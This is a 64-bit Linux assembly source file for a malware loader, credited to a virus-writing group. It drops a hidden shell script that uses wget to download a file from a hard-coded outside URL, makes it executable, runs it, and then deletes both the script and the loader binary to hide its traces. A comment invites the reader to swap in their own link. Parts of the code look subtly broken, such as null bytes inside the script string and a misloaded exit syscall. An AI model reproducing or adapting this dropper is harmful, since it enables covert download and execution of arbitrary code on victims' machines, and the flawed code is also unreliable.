; simple loader in 64 bit linux asm
;
; drops a shell script to download and execute the file
; deletes itself
;
; written by R3s1stanc3 [vxnetw0rk]

global _start


section .data

    %defstr home %!HOME
    %defstr home_env HOME=%!HOME

    HOME:           db home,0
    HOME_ENV:       db home_env,0

    script:     db "#!/bin/sh", 10, "export name=.file", 10
            db "wget ", 0
            db "http://www.r3s1stanc3.co.cc/test.sh", 0 ; change the link
            db " -O $name", 10
            db "chmod +x $name", 10
            db "./$name", 10
            db "rm ...", 10
            db "rm $0", 0
    scriptLEN:  equ $-script
    scriptname: db '.loader.sh', 0

    newname:    db '...', 0

    shell:      db "/bin/sh", 0
    argv:       dd shell, scriptname, 0
    endv:       dd HOME_ENV, 0


_start:


    mov rax,    85          ; sys_creat
    mov rdi,    scriptname
    mov rsi,    00755Q                  ; -rwxr-xr-x in octa
    syscall

    test    rax,    rax
    js  Exit

    mov rdi,    rax
    mov rax,    1           ; sys_write
    mov rsi,    script
    mov rdx,    scriptLEN
    syscall

    mov rax,    59          ; sys_execv
    mov rdi,    shell
    mov rsi,    argv
    mov rdx,    endv
    syscall

    mov rax,    87          ; sys_unlink
    mov rdi,    [rsp+8]         ; get filename of the stack
    syscall                 ; delete yourself


Exit:
    mov     rdx,    60          ; sys_exit
    mov rdi,    0           ; return 0 (success)
    syscall                 ; call the kernel
